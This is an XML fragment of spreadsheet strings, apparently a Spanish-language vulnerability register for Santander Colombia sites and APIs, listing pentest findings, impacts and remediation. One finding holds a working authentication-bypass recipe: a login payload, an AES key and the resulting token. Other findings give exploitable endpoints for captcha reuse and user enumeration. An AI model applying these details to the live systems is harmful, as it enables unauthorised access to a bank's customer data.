    <t>Las vulnerabilidades y exposiciones comunes (CVE) son una lista de vulnerabilidades conocidas públicamente en software y hardware. Cada CVE contiene un ID, una descripción de la vulnerabilidad y los nombres de los productos y versiones que se ven afectados por la vulnerabilidad.
El software y el hardware suelen informar por sí mismos del nombre y la versión de su producto cuando los hosts se conectan a ellos. Buscando en la lista CVE y cruzando los nombres y versiones de los productos encontrados en la red de esta empresa, podemos deducir la presencia de vulnerabilidades.</t>
  </si>
  <si>
    <t>Actualice o parchee el software y el hardware afectados. Habilite las actualizaciones automáticas si están disponibles en su proveedor de software y están permitidas en su entorno. Supervise las listas de CVE y los repositorios de vulnerabilidades en busca de código de explotación que pueda afectar a su infraestructura. Suscríbase a la lista de correo de Bugtraq para recibir alertas sobre nuevos exploits y vulnerabilidades a medida que se publican. Mantenga un programa de actualización regular para todo el software y hardware en uso dentro de su organización, asegurándose de que todos los parches más recientes se apliquen poco después de su publicación.</t>
  </si>
  <si>
    <t>Hemos observado una vulnerabilidad de gravedad media durante nuestro último escaneo, que todavía puede estar expuesta públicamente.</t>
  </si>
  <si>
    <t>QA-WAS-02efa0cd-fc06-4090-b21b-b8ccaa0a8df8</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor web.</t>
  </si>
  <si>
    <t>falso positivo
RITM011127883</t>
  </si>
  <si>
    <t>Certificate Is Self-Signed</t>
  </si>
  <si>
    <t>Cuando se emite un certificado, se firma con una clave privada. Los servicios de acceso público deben tener certificados firmados por claves asociadas a autoridades de certificación (CA). Las credenciales de las autoridades de certificación se almacenan en una tabla llamada almacén de confianza que está incorporada a los navegadores web y sistemas operativos modernos. Los certificados firmados por claves que no están en el almacén de confianza impiden a los clientes TLS conectarse a los servidores.
El software y el hardware disponibles en el mercado suelen ejecutar servicios que utilizan certificados autofirmados por defecto. Si estos servicios son de acceso público, deben configurarse para utilizar certificados emitidos por autoridades de certificación conocidas. Si no se hace así, los usuarios del servicio se exponen a ataques de intermediario en la Internet abierta.
Los certificados autofirmados tienen casos de uso limitados pero legítimos, como la protección de servicios cuyos clientes están configurados para utilizar la clave pública.</t>
  </si>
  <si>
    <t>Si el servicio no está en uso, desactívelo. De lo contrario, póngase en contacto con la CA y organice la emisión de un nuevo certificado.</t>
  </si>
  <si>
    <t>Los certificados autofirmados impiden que los clientes TLS se conecten a los servidores.</t>
  </si>
  <si>
    <t>Certificate Lifetime Is Longer Than Best Practices</t>
  </si>
  <si>
    <t>Cuando una autoridad de certificación (CA) emite un certificado, incluye dos fechas: la fecha en la que el certificado empieza a ser válido y la fecha en la que deja de serlo.
Los algoritmos criptográficos no tienen una vida útil definida, pero los académicos, los investigadores y los estados nacionales los evalúan constantemente en busca de debilidades. El Foro de Autoridades de Certificación y Navegantes (CAB), un grupo de la industria que establece normas en torno a la creación y el uso de certificados, publica periódicamente actualizaciones de un documento denominado Requisitos Básicos (BR). Aproximadamente cada dos años se actualiza el BR para reducir el periodo máximo de validez de los certificados emitidos a partir de una fecha determinada. Los certificados más antiguos tienen períodos de validez más largos, pero los certificados emitidos después del 1 de septiembre de 2020 deben tener períodos de validez no superiores a 398 días.</t>
  </si>
  <si>
    <t>Se observó un certificado con un periodo de validez superior al dictado por los requisitos básicos del foro del CAC.</t>
  </si>
  <si>
    <t>Certificate Without Revocation Control</t>
  </si>
  <si>
    <t>Cuando una autoridad de certificación (CA) emite un certificado, incluye direcciones URL que pueden utilizarse para comprobar si un certificado ha sido revocado. Los certificados revocados dejan de ser válidos, y los clientes TLS (por ejemplo, los navegadores web) se negarán a conectarse a servidores que presenten certificados revocados.
Los certificados se revocan por diversas razones: el desmantelamiento de un servidor, la retirada de un producto o nombre comercial, la renovación anticipada de un certificado de sustitución o la creencia de que un atacante puede haber adquirido la clave privada correspondiente al certificado.
Si un certificado no incluye controles de revocación, no puede ser revocado. Emitir credenciales irrevocables es una violación de las mejores prácticas.</t>
  </si>
  <si>
    <t>Se observó un certificado que no contenía ni CRL ni OCSP URL.</t>
  </si>
  <si>
    <t>MAN-b840514a</t>
  </si>
  <si>
    <t>SC-22-CNMPO-001-AP-001</t>
  </si>
  <si>
    <t>https</t>
  </si>
  <si>
    <t>se ha podido comprobar, que la aplicación analizada devuelve una
respuesta diferente si se introduce un usuario válido en el sistema de uno que no lo es.
Las funciones afectadas son:
· Recuperar contraseña
o URL afectada: https://confirmingfactoring.
santander.com.co/factoring/common/mainPages/login.seam?FACTBOTTK
NCSR=&lt;token&gt;
o Parámetro: (POST) email</t>
  </si>
  <si>
    <t>Se recomienda que los mecanismos de recuperación de contraseñas de la aplicación no
proporcionen evidencias que nos permitan discernir si el usuario introducido está dado de alta o
no en la misma, mediante mensajes de error, tamaño de las respuestas del servidor o tiempos de
respuesta de la aplicación, tal y como hemos identificado en el alcance de las presentes pruebas.</t>
  </si>
  <si>
    <t>Esta debilidad podría ser utilizada por un atacante o usuario malicioso para intentar obtener un
listado de los usuarios del sistema. Utilizando posteriormente dicha información para planificar y
generar ataques de mayor impacto, como, por ejemplo, ataques de averiguación de contraseñas o
fuerza bruta sobre usuarios existentes en el sistema.</t>
  </si>
  <si>
    <t>MAN-b840514b</t>
  </si>
  <si>
    <t>SC-22-CNMPO-001-VE-002</t>
  </si>
  <si>
    <t>Librería desactualizada en uso</t>
  </si>
  <si>
    <t>Se ha observado la presencia de una librería que se encuentra desactualizada. Adicionalmente, dicha
librería se encuentra fuera de soporte.
· Librería no soportada: jQuery 1.3.2
URL afectada:
· https://confirmingfactoring.
santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/framework.pack.js.sea
m</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de actualizar la librería afectada a la última versión
disponible.
Adicionalmente se recomienda realizar el monitoreo regular de las actualizaciones de las librerías
en uso para todas las aplicaciones y asegurarse de instalarlas en un tiempo prudencial.</t>
  </si>
  <si>
    <t>Un individuo malicioso podría comprometer con mayor facilidad la librería afectada, ya que la
versión observada posee vulnerabilidades y/o debilidades de seguridad previamente reportadas. En
consecuencia, un individuo malicioso podría intentar explotarlas para comprometer a los usuarios
de la aplicación. Además, al estar fuera de soporte, el fabricante no proporcionará parches ni
actualizaciones para corregir las vulnerabilidades actuales y futuras.</t>
  </si>
  <si>
    <t>La vulnerabilidad esta duplicada, es la misma del (SC-22-CNMPO-007-AP-001)</t>
  </si>
  <si>
    <t>MAN-b840514c</t>
  </si>
  <si>
    <t>SC-22-CNMPO-001-AP-003</t>
  </si>
  <si>
    <t>Debilidades en el esquema de preguntas de seguridad</t>
  </si>
  <si>
    <t>Se ha observado que la aplicación presenta el esquema de preguntas de seguridad como factor de
autenticación para la recuperación de contraseña. Adicionalmente el esquema de preguntas de
seguridad observado presenta oportunidades de mejora. A continuación, se detallan las debilidades
observadas en el mismo:
· Preguntas de seguridad disponibles de baja complejidad.
· Las respuestas proporcionadas por el usuario no son enmascaradas en la interface web.</t>
  </si>
  <si>
    <t>El uso de preguntas de seguridad ha dejado de ser considerado un factor de autenticación por el
National Institute of Standarts and Tecnology (NIST), y se recomienda cambiar el mismo por un factor de autenticación diferente (por ejemplo, recuperación vía correo electrónico asociado a la cuenta).
Adicionalmente se recomienda cambiar las preguntas de seguridad ofrecidas por la aplicación, por
otras de mayor complejidad de respuesta y obtención para un usuario malicioso como, por ejemplo:
· ¿Cuál es el nombre de la escuela a la que aplicaste, pero no pudiste ir?
· ¿Cuál es el nombre de la primera escuela a la que recuerdas haber asistido?
· ¿Cuál fue el destino de tu viaje escolar más memorable?
Se recomienda adicionalmente tener un set de varias preguntas y que el usuario pueda elegir la que
más se adapte a su respuesta. Además, se recomienda modificar el tipo de datos de entrada para
los campos de texto del código HTML de las funcionalidades que solicitan el ingreso de respuestas a
las preguntas de seguridad, para asegurarse que las mismas sean enmascaradas al igual que los
campos de contraseña.</t>
  </si>
  <si>
    <t>Un débil esquema de preguntas de seguridad le proporciona a un individuo malicioso la oportunidad
de obtener el control de una cuenta de usuario válida. Al tener baja complejidad las preguntas
disponibles para el usuario, un usuario malicioso podría identificar la respuesta correcta si el mismo
tiene relación con la víctima o la pudo investigar a través de internet. Al no encontrarse ofuscado el
texto introducido en el campo de respuesta, se brinda la posibilidad a un individuo malicioso (que
se encuentre dentro de la proximidad de un usuario o a través de un software malicioso de captura
de pantalla) de obtener la respuesta para acceder de forma no autorizada a la aplicación.</t>
  </si>
  <si>
    <t>MAN-b840514d</t>
  </si>
  <si>
    <t>SC-22-CNMPO-001-AP-004</t>
  </si>
  <si>
    <t>Inadecuado manejo de errores</t>
  </si>
  <si>
    <t>Se ha observado que al acceder a la URL afectada se genera un mensaje de error propios de los
componentes del ambiente, que son propagado a la interfaz de usuario.
La URL afectada es:
· https://confirming-factoring.santander.com.co/factoring/JavaScriptServlet</t>
  </si>
  <si>
    <t>Se deben controlar todas las entradas o valores que el aplicativo recibe por parte del cliente, y
realizar un tratamiento seguro de sus valores evitando proporcionar información útil a un posible
atacante. Adicionalmente para no proporcionar información al atacante se recomienda personalizar
las páginas de error para que no sean descriptivas, dando siempre el mínimo de información
necesaria.</t>
  </si>
  <si>
    <t>El manejo inadecuado de errores puede presentar una variedad de problemas de seguridad para un
sitio web. El problema más común es cuando los mensajes de error internos detallados, como los
rastreos de la pila, se muestran al usuario. Estos mensajes revelan detalles de implementación que
nunca deberían revelarse. Dichos detalles pueden proporcionar a un posible atacante pistas
importantes sobre el funcionamiento interno de la aplicación y facilitar el proceso de explotación.
Teniendo en cuenta toda esta información, se ha categorizado esta vulnerabilidad con riesgo leve.</t>
  </si>
  <si>
    <t>MAN-b840514e</t>
  </si>
  <si>
    <t>SC-22-CNMPO-001-AP-005</t>
  </si>
  <si>
    <t>Respuestas HTTPs chacheables</t>
  </si>
  <si>
    <t>La cabecera HTTP Cache-Control, incluye directivas específicas que restringen el almacenamiento
del contenido tanto enviado a como devuelto por la aplicación en sistemas de caché, ya sean estos
locales (equipo del usuario) como remotos (proxys de red).
Durante las pruebas realizadas se han detectado respuestas emitidas por la aplicación que no
limitan el almacenamiento de su contenido localmente en los equipos de los usuarios.
Nota: La falta o configuración incorrecta de estos encabezados no representan la existencia efectiva de
información sensible que esté siendo cacheada por los navegadores o una posibilidad concreta de
explotación.</t>
  </si>
  <si>
    <t>Se recomienda modificar la cabecera HTTP “Cache-control”, incluir la directiva indicada, a todas las
respuestas devueltas por la aplicación y que puedan contener información sensible:
· Cache-control: no-store</t>
  </si>
  <si>
    <t>Muchos navegadores, incluyendo Internet Explorer, cachean el contenido obtenido vía HTTPs a
menos que se indique lo contrario.
Si estas respuestas almacenadas localmente incluyen contenido sensible éste podría ser leído por
otros usuarios con acceso al mismo equipo. Teniendo en cuenta toda esta información, se ha
categorizado esta vulnerabilidad con riesgo bajo.
RECOMENDACIÓN</t>
  </si>
  <si>
    <t>MAN-883485df</t>
  </si>
  <si>
    <t>SC-22-CNMPA-002-AP-001</t>
  </si>
  <si>
    <t>Uso de librerías JavaScript vulnerables</t>
  </si>
  <si>
    <t>CVE-2020-11022
CVE-2020-11023</t>
  </si>
  <si>
    <t>En la versión utilizada se ha identificado las siguientes vulnerabilidades conocidas:
· CVE-2020-11022: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS
· CVE-2020-11023: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS
Enlace afectado:
https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2f</t>
  </si>
  <si>
    <t>Desarrolle una estrategia de administración de parches para garantizar que las actualizaciones de
seguridad se apliquen rápidamente a todas las bibliotecas de terceros en su aplicación.
Además, considere reducir su superficie de ataque eliminando las bibliotecas que ya no están en
uso.</t>
  </si>
  <si>
    <t>La utilización de versiones vulnerables pueden ser utilizadas por posibles atacantes de forma
automatizada.</t>
  </si>
  <si>
    <t>Fecha de decomiso:
31/12/2023</t>
  </si>
  <si>
    <t>MAN-88348814</t>
  </si>
  <si>
    <t>SC-22-CNMPO-003-AP-001</t>
  </si>
  <si>
    <t>Durante las pruebas se han identificado una manera de realizar enumeración de usuarios automatizada. Esto es debido a que el proceso de Login consta de un primer paso dónde se solicita el nombre de usuario, sin captcha, y se procede a comprobar si el usuario existe obteniendo información relativa del mismo para saber si esta bloqueado entre otra información.
Esta petición de comprobación inicial, puede ser utilizada en procesos automatizados para llevar a cabo una enumeración de usuarios, pudiendo saber así, de entre una lista de usuarios, cuáles existen o no. Esto puede ser utilizado para realizar una segunda fase, dónde un atacante proceda al bloqueo continuado de una cuenta, y ataques de phishing en paralelo al usuario, si se conociese
el correo electrónico, u otro tipo de ataques similares.</t>
  </si>
  <si>
    <t>Se recomienda que el mecanismo de autenticación no proporcione evidencias que nos permitan discernir si el usuario introducido está dado de alta, o no, mediante mensajes de error, tamaño de las respuestas del servidor o tiempos de respuesta de la aplicación, tal y como hemos identificado en el alcance de las presentes pruebas.</t>
  </si>
  <si>
    <t>Esta debilidad podría ser utilizada por un atacante o usuario malicioso para intentar obtener un
listado de los usuarios del sistema. Utilizando posteriormente dicha información para planificar y
generar ataques de mayor impacto, como por ejemplo, ataques de averiguación de contraseñas,
ataques de phishing o fuerza bruta sobre usuarios existentes en el sistema. Un posible atacante
podría realizar una enumeración de usuarios en la plataforma, para posteriormente realizar ataques
de tipo “passwordSpraying”, entre otros contra la aplicación y así obtener acceso a alguna cuenta de
usuario o administrador.
Teniendo en cuenta ésta configuración, se ha categorizado la vulnerabilidad como media.</t>
  </si>
  <si>
    <t>API Prospera</t>
  </si>
  <si>
    <t>MAN-7b9da024</t>
  </si>
  <si>
    <t>SCO-22-CNMPO-010-AP-001</t>
  </si>
  <si>
    <t>Inadecuada configuración de seguridad de capa de transporte (TLS)</t>
  </si>
  <si>
    <t>https://prospera.santanderconsumer.co</t>
  </si>
  <si>
    <t>La vulnerabilidad de Configuración insegura SSL/TLS hace referencia a la utilización de cifrados débiles en la capa de transporte que provee a un individuo malicioso oportunidades para comprometer exitosamente la información transmitida sobre un canal cifrado.
Se ha observado que la aplicación presenta debilidades en la configuración de seguridad de los cifrados SSL/TLS. Estas debilidades incluyen:
• Conjuntos de cifrado CBC</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de rever si la configuración observada responde a un requisito de negocio. De lo contrario, se recomienda deshabilitar los conjuntos de cifrado que incluyan claves de cifrado CBC y configurar el orden de cifrado en el servidor con preferencias para utilizar conjuntos de cifrado PFS.</t>
  </si>
  <si>
    <t>Una explotación exitosa podría permitir a un atacante descifrar, leer o modificar los datos de tráfico interceptados, que pueden contener datos sensibles como la contraseña de inicio de sesión de un usuario u otros datos personales. Sin embargo, la vulnerabilidad sólo afecta a los usuarios para los que el atacante puede interceptar el tráfico. Los impactos de confidencialidad e integridad se limitan al ámbito del usuario interceptado. No se requiere autenticación alguna para realizar el ataque.</t>
  </si>
  <si>
    <t>Martha Johanna Sanchez Sanchez</t>
  </si>
  <si>
    <t>MAN-7b9da025</t>
  </si>
  <si>
    <t>SCO-22-CNMPO-010-AP-002</t>
  </si>
  <si>
    <t>Exposición de información sensible</t>
  </si>
  <si>
    <t>La vulnerabilidad de exposición de información sensible hace referencia a la información expuesta por parte de la aplicación otorga detalles del entorno de desarrollo en uso, lo que provoca que un usuario malintencionado pueda realizar ataques más precisos sobre la aplicación.
Se ha observado que la aplicación revela en la respuesta que realiza el servidor, información técnica de un recurso asociado a la compañía, esto sucede al enviar texto aleatorio en el cuerpo de la solicitud, en consecuencia, se exponen rutas de directorios internos pertenecientes al entorno Node.js y la cabecera “x-powered-by: Express” exponiendo la tecnología del servidor en uso.</t>
  </si>
  <si>
    <t>La recolección de información es, usualmente, el primer paso para realizar un ataque. La respuesta del servidor contiene información sobre las tecnologías en uso, que podría ser utilizada como base para un ataque posterior de mayor sofisticación. No se requiere autenticación para realizar el ataque.</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de eliminar la información sensible expuesta a través de los recursos mencionados. Además, se recomienda actualizar los estándares de seguridad en el desarrollo y puesta en producción de servicios, de manera tal que contemple los riesgos asociados a la exposición de información sensible referente a la infraestructura interna, tales como nombres de servidores en uso y rutas de directorios del entorno de desarrollo.</t>
  </si>
  <si>
    <t>la vulnerabilidad SCO-22-CNMPO-010-AP-002 se ha indicado en el nuevo informe con el ID SC-22-CNMPO-008-AP-002 y se ha cerrado la anterior.</t>
  </si>
  <si>
    <t>Supernet/Empresas</t>
  </si>
  <si>
    <t>MAN-33d25a01</t>
  </si>
  <si>
    <t>SC-22-CNMPO-006-CO-001</t>
  </si>
  <si>
    <t>TLS MAC calculation timing attack (LUCKY13)</t>
  </si>
  <si>
    <t>https://www.santander.com.co/Empresas/</t>
  </si>
  <si>
    <t>La vulnerabilidad de TLS MAC calculation timing attack o LUCKY13 es una vulnerabilidad de cifrado que aplica a la implementación de Transport Layer Security (TLS) que utilizan el modo de cifrado CBC.
Este ataque consiste en detectar pequeñas diferencias de tiempo cuando se producen errores TLS generados a base de mandar peticiones maliciosas al servidor. Con estos ataques es posible descifrar bloques TLS, aunque la cantidad de peticiones depende del tipo de conexión, el ruido y el algoritmo de MAC utilizado.</t>
  </si>
  <si>
    <t>Se recomienda deshabilitar el modo de cifrado CBC y aplicar los parches disponibles.</t>
  </si>
  <si>
    <t>Es posible utilizar mecanismos de cifrado considerados inseguros en las comunicaciones con los servidores, lo que podría permitir a un eventual atacante comprometer la confidencialidad de la información intercambiada entre un cliente y el servidor, y en algunos casos también provocar indisponibilidad del servidor.</t>
  </si>
  <si>
    <t>1° Fecha: 31/10/2024</t>
  </si>
  <si>
    <t>Escalado: 01/12/2022
Escalado: 27/02/2023
Escalado: 29/06/2023
Escalado: 12/07/2023
Escalado: 19/04/2024
Revisar con SDS México</t>
  </si>
  <si>
    <t>MAN-33d25a19</t>
  </si>
  <si>
    <t>SC-22-CNMPO-006-CO-002</t>
  </si>
  <si>
    <t>Rate limiter potencialmente no implementado</t>
  </si>
  <si>
    <t>Se ha observado que el recurso afectado posiblemente no implementa un Rate Limiter (limitador de velocidad), lo que permite a los usuarios realizar varias solicitudes por segundo, en nuestro caso fuimos capaces de realizar 93 peticiones en un segundo.</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de implementar un Rate Limiter para el recurso afectado, limitando las solicitudes por segundo y por hora para cada usuario. Además, se recomienda considerar revisar los estándares de desarrollo y configuración para asegurar que se establezcan Rate Limiters en todos los servicios y sistemas.</t>
  </si>
  <si>
    <t>Un Rate Limiter se usa para controlar el tráfico enviado o recibido en la API. Un usuario mal intencionado que abuse del recurso afectado podría enviar una gran cantidad de solicitudes en un intervalo de tiempo relativamente corto, con la ayuda de herramientas automatizadas, y causar una carga computacional muy alta en el servidor. Esto podría potencialmente causar una denegación del servicio y hacer que el recurso afectado no esté disponible.</t>
  </si>
  <si>
    <t>Escalado: 01/12/2022
Escalado: 27/02/2023
Escalado: 29/06/2023
Escalado: 12/07/2023
Escalado: 19/04/2024
Escalar con el WAF</t>
  </si>
  <si>
    <t>MAN-33d25a49</t>
  </si>
  <si>
    <t>SC-22-CNMPO-006-AP-003</t>
  </si>
  <si>
    <t>Librerías desactualizadas en uso</t>
  </si>
  <si>
    <t>Se ha observado la presencia de una librería que se encuentran desactualizada. La librería observada, junto con las vulnerabilidades identificadas se detallan a continuación:
• https://www.santander.com.co/Empresas/scripts.dcb54f8925a643cd5303.js</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de actualizar la librería afectada a la última versión disponible. Adicionalmente se recomienda realizar el monitoreo regular de las actualizaciones de las librerías en uso para todas las aplicaciones y asegurarse de instalarlas en un tiempo prudencial.</t>
  </si>
  <si>
    <t>Un individuo malicioso podría comprometer con mayor facilidad la librería afectada, ya que la versión observada posee vulnerabilidades y/o debilidades de seguridad previamente reportadas. En consecuencia, un individuo malicioso podría intentar explotarlas para comprometer a los usuarios de la aplicación.</t>
  </si>
  <si>
    <t>1° Fecha: 16/01/2023
2° Fecha: 09/08/2024
3° Fecha: 18/10/2024</t>
  </si>
  <si>
    <t>Escalado: 01/12/2022
Escalado: 27/02/2023
Escalado: 29/06/2023
Escalado: 12/07/2023
Escalado: 19/04/2024</t>
  </si>
  <si>
    <t>MAN-33cfe9d5</t>
  </si>
  <si>
    <t>SC-22-CNMPA-004-CO-001</t>
  </si>
  <si>
    <t>Enumeración de nombres cortos de archivos y
directorios de Microsoft</t>
  </si>
  <si>
    <t>Se ha detectado que es posible enumerar el nombre corto de un archivo en el recurso. El archivo encontrado corresponde a “a.aspx”</t>
  </si>
  <si>
    <t>Se recomienda deshabilitar la creación de nombres cortos en caso de que no fuera requerida por necesidades del negocio.</t>
  </si>
  <si>
    <t>Un individuo malicioso podría aprovechar esta vulnerabilidad para intentar enumerar nombres cortos de directorios y archivos válidos alojados en el servidor que potencialmente pudieran contener información sensible, para luego ejecutar también ataques específicos con el fin de obtener el nombre completo (nombre largo). Esto podría permitir al individuo malicioso ganar acceso no autorizado a los archivos afectados, si los mismos no se encuentran protegidos por un esquema de control acceso adecuado.</t>
  </si>
  <si>
    <t>MAN-33cfe9d8</t>
  </si>
  <si>
    <t>SC-22-CNMPA-004-AP-002</t>
  </si>
  <si>
    <t>Exposición de información potencialmente
sensible</t>
  </si>
  <si>
    <t>Se ha observado que el servidor devuelve información potencialmente sensible como el nombre del usuario y el IDE usado al acceder al siguiente recurso:
• www.santander.com.co/js/jscookies/cookies-utils.js</t>
  </si>
  <si>
    <t>Se recomienda revisar la configuración asociada al componente que produce la explosión de información sensible, con el fin de analizar las diferentes opciones para mitigar la exposición, por ejemplo realizar un sanitizado de los comentarios en los archivos productivos.</t>
  </si>
  <si>
    <t>Un individuo malicioso podría aprovechar la información expuesta para planificar y realizar ataques más precisos hacia la infraestructura de la aplicación.</t>
  </si>
  <si>
    <t>Pre:
1° Fecha: 23/08/2024
Pro:
1° Fecha: 30/09/2024</t>
  </si>
  <si>
    <t>MAN-33cfe9d2</t>
  </si>
  <si>
    <t>SC-22-CNMPA-004-CO-003</t>
  </si>
  <si>
    <t>Información interna en metadatos de documentos</t>
  </si>
  <si>
    <t>Durante las pruebas se observó que al extraer los metadatos de varios documentos “.pdf”, estos revelan el nombre del autor que los escribió. Los recursos afectados son:
• https://www.santander.com.co/recursos/archivos/proyecto-distribucion-utilidades-aprobado-aga.pdf
• https://www.santander.com.co/recursos/archivos/informacion-revelante-aga.pdf
• https://www.santander.com.co/recursos/archivos/2-proyecto-utilidad-o-perdida.pdf
• https://www.santander.com.co/recursos/archivos/8-decisiones-asamblea.pdf</t>
  </si>
  <si>
    <t>Se recomienda eliminar toda la información contenida en los metadatos de los documentos generados y/o publicados en la aplicación. Además, se recomienda implementar un procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los mismos no contengan información sensible de la organización en sus metadatos.</t>
  </si>
  <si>
    <t>Un atacante podría aprovechar la información relevada a través de los metadatos contenidos en documentos “.pdf” para llevar a cabo ataques de mayor envergadura mediante técnicas de ingeniería social o atacando las tecnologías utilizadas dentro de la organización.</t>
  </si>
  <si>
    <t>MAN-33d3204c</t>
  </si>
  <si>
    <t>SC-22-CNMPO-007-AP-001</t>
  </si>
  <si>
    <t>CVE-2019-11358
CVE-2020-11022
CVE-2020-11023</t>
  </si>
  <si>
    <t>27/032023</t>
  </si>
  <si>
    <t>Se ha observado la presencia de una librería que se encuentran desactualizada. La librería observada.
jQuery - 1.3.2</t>
  </si>
  <si>
    <t>MAN-33d32042</t>
  </si>
  <si>
    <t>SC-22-CNMPO-007-CO-002</t>
  </si>
  <si>
    <t>Enumeración de nombres cortos de archivos y directorios de Microsoft</t>
  </si>
  <si>
    <t>La aplicación es susceptible a la enumeración de nombres cortos de archivos y directorios. Cuando un nuevo archivo es creado en un ambiente Windows, se crea también un nombre corto compatible con el formato 8.3 de MS-DOS para dicho archivo. Este nombre corto permite a programas basados en MS-DOS o Windows 16 bits acceder a archivos con nombres largos.
Se ha detectado que es posible enumerar el nombre corto de un archivo en el recurso. El archivo encontrado corresponde a “a.asp”</t>
  </si>
  <si>
    <t>MAN-33d32043</t>
  </si>
  <si>
    <t>SC-22-CNMPO-007-CO-003</t>
  </si>
  <si>
    <t>La vulnerabilidad de potencial Rate Limiter no implementado hace referencia al faltante de un limitador de velocidad para evitar que el sistema sea vulnerable a ataques de tipo DoS.
Se ha observado que el recurso afectado posiblemente no implementa un Rate Limiter (limitador de velocidad), lo que permite a los usuarios realizar varias solicitudes por segundo, en nuestro caso fuimos capaces de realizar 102 peticiones en un segundo.</t>
  </si>
  <si>
    <t>1° Fecha 10/03/2023
2° Fecha: 12/02/2024
3° Fecha: 31/07/2024</t>
  </si>
  <si>
    <t>MAN-33d3204d</t>
  </si>
  <si>
    <t>SC-22-CNMPO-007-AP-004</t>
  </si>
  <si>
    <t>Evasión de captcha</t>
  </si>
  <si>
    <t>La vulnerabilidad de evasión de captcha hace referencia a la utilización de imágenes que pueden ser resueltas por medio de herramientas OCR, lo que podría derivar en ataques de fuerza bruta y enumeración de usuarios.
Se ha observado que se puede extraer el mismo captcha que devuelve la aplicación en el formulario del login si se envía el mismo JSESSIONID que se utiliza en el login, al navegar a la siguiente URL:
• https://confirming-factoring.santander.com.co/factoring/seam/resource/captcha
Posterior a esto se observó que es posible resolver el captcha con ayuda de una herramienta OCR.</t>
  </si>
  <si>
    <t>Se recomienda implementar un mecanismo de captcha que siempre cambie la imagen independientemente del JSESSIONID utilizado. Además se recomienda utilizar sistemas que realicen una generación aleatoria de los gráficos asignados a los caracteres del “CAPTCHA”, con el fin de que los gráficos no sean fácilmente resueltos por herramientas OCR.</t>
  </si>
  <si>
    <t>Un individuo malicioso podría aprovechar esta vulnerabilidad para obtener la imagen del captcha que devuelve la aplicación en el login y automatizar el proceso de extracción de texto del captcha, lo cual le permitiría realizar consultas repetitivas sobre el formulario. Las mismas podrían eventualmente utilizarse para realizar ataques de fuerza bruta o enumeración de usuarios.</t>
  </si>
  <si>
    <t>1: Fecha 12/02/2024</t>
  </si>
  <si>
    <t>BOT considera que aunque se pueda reconocer el CAPTCHA no es posible explotar el tema ya que el sistema maneja el contador de intentos antes de bloquear a un usuario
Se debe enviar la propuesta generada por BOT, y enviar el detalle tecnico para revisión</t>
  </si>
  <si>
    <t>MAN-33d3204e</t>
  </si>
  <si>
    <t>SC-22-CNMPO-007-AP-005</t>
  </si>
  <si>
    <t>Session fixation</t>
  </si>
  <si>
    <t>La vulnerabilidad de session fixation o fijación de sesión en español, hace referencia a la práctica insegura de conservar el mismo valor de las cookies de sesión antes y después de la autenticación.
Se ha observado que la aplicación no cambia el valor del identificador de sesión luego de un intento de autenticación exitoso.</t>
  </si>
  <si>
    <t>Se recomienda analizar y modificar el módulo de gestión de sesiones de la aplicación, de manera tal que el identificador de sesión se cambie una vez que el usuario se autentica de manera exitosa. Además, se recomienda revisar los estándares de desarrollo para asegurarse que contemplen la renovación de los identificadores de sesión para lograr consistencia en las aplicaciones de la organización.</t>
  </si>
  <si>
    <t>Un individuo malicioso que logre obtener el identificador de sesión (cookie) de un usuario, podría aguardar a que este usuario se autentique y su identificador de sesión obtenga privilegios de usuario autenticado, para luego recuperar la sesión y acceder a la aplicación con los mismos privilegios concedidos al usuario legítimo.</t>
  </si>
  <si>
    <t>MAN-33d542f2</t>
  </si>
  <si>
    <t>SC-22-CNMPO-008-AP-001</t>
  </si>
  <si>
    <t>Mecanismo de autenticación débil</t>
  </si>
  <si>
    <t>Se ha invocado a la API a través de la URL afectada utilizando el siguiente JSON:
• {"usuario":"PREHPROS01","clave":"deloitte","tabletUUID":"e10adc3949ba59abbe56e057f20f883e","apkVersion":"3.3.6"}
El token posee un usuario válido pero una contraseña invalida. Utilizando la clave AES se cifró el JSON generando el siguiente token:
• U2FsdGVkX19JBZnh0/ft7HyEXxUVHsamlZhNOp7Kiexjs85SDIXiQIeKlpfAUBPS7MM6h5jbHBY6yZ6nTWNS3cYOhFC3zY4gIoyvjCPwLEWoNVc4ZFb5RRehe5zSPZCV/tgzCvUqUb+rHJX9zkVZwe4WFAT0Ekg5zN+vbka6dpuri46DNezj0/ATMOa/pnhD
De esa forma se invocó a la URL descrita y se obtuvo una respuesta válida. La llave utilizada el día 14/12/2022 fue "20221216202408142022120420671214".</t>
  </si>
  <si>
    <t>Se recomienda modificar la aplicación para garantizar que todas las funcionalidades privadas o que formen parte de un flujo de operación, puedan ser accedidas únicamente por usuarios que se encuentren autenticados con credenciales válidas y con los privilegios adecuados.</t>
  </si>
  <si>
    <t>La observación identificada podría permitir a un usuario malintencionado, acceder a información conociendo solamente un nombre de usuario válido, pudiendo de esta forma recopilar información interna de la organización y a partir de esta planificar un ataque enfocado.</t>
  </si>
  <si>
    <t>MAN-33d542f3</t>
  </si>
  <si>
    <t>SC-22-CNMPO-008-AP-002</t>
  </si>
  <si>
    <t xml:space="preserve">Se ha observado que al enviar ciertas solicitudes que son consideradas invalidas a la aplicación se generan mensajes de error propios de los componentes del ambiente, los que son propagados a la interfaz de usuario.
</t>
  </si>
  <si>
    <t>Se deben controlar todas las entradas o valores que el aplicativo recibe por parte del cliente, y realizar un tratamiento seguro de sus valores evitando proporcionar información útil a un posible atacante. Adicionalmente para no proporcionar información al atacante se recomienda personalizar las páginas de error para que no sean descriptivas, dando siempre el mínimo de información necesaria.</t>
  </si>
  <si>
    <t>El manejo inadecuado de errores puede presentar una variedad de problemas de seguridad para un sitio web. El problema más común es cuando los mensajes de error internos detallados, como los rastreos de la pila, los volcados de la base de datos y los códigos de error, se muestran al usuario. Estos mensajes revelan detalles de implementación que nunca deberían revelarse. Dichos detalles pueden proporcionar a un posible atacante pistas importantes sobre el funcionamiento interno de la aplicación y facilitar el proceso de explotación.</t>
  </si>
  <si>
